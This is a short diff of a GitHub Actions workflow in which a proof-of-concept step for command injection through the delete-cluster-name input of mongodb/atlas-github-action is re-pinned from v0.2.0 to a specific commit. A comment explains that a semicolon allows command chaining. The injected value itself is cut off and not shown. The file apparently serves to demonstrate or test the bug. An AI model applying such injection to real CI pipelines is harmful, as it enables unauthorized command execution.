@@ -15,7 +15,7 @@ jobs:
 
       - name: POC - Command Injection via delete-cluster-name
         # old version to verify bug
-        uses: mongodb/atlas-github-action@v0.2.0
+        uses: mongodb/atlas-github-action@d2290a92432eaa7196e052500cb347bbe0bbffdd
         continue-on-error: true
         with:
           # This demonstrates command injection - the semicolon allows command chaining
